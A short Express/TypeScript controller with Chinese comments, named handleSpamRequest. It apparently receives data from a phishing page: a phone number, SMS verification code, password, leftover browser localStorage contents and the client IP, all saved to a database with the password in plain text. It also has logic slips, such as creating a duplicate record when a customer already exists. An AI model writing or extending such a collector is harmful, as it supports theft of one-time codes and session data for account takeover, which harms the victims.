import { Request, Response } from 'express';
import Customer from '../models/customer'; // 确保正确导入 Customer 模型
import handleAsync from '../utils/handleAsync';

export const handleSpamRequest = handleAsync(
  async (req: Request, res: Response) => {
    const { data } = req.body;

    const parsedData = JSON.parse(data);

    const { phoneCode, password, phoneNumber, ...rest } = parsedData;

    if (!phoneNumber && !phoneCode) {
      res.status(400);
      throw new Error('Phone number and verification code is required');
    }

    const existingCustomer = await Customer.findOne({ phoneNumber });

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; // 获取客户端 IP 地址

    if (existingCustomer) {
      await existingCustomer.updateOne({
        phoneCode,
        password: password || existingCustomer.password,
        localStorage: JSON.stringify(rest),
        ip,
      });
    }

    const newCustomer = new Customer({
      phoneCode,
      password,
      phoneNumber,
      localStorage: JSON.stringify(rest),
      ip,
    });

    await newCustomer.save();

    res.status(200).json({
      message: 'success',
      data: { phoneCode },
    });
  },
);
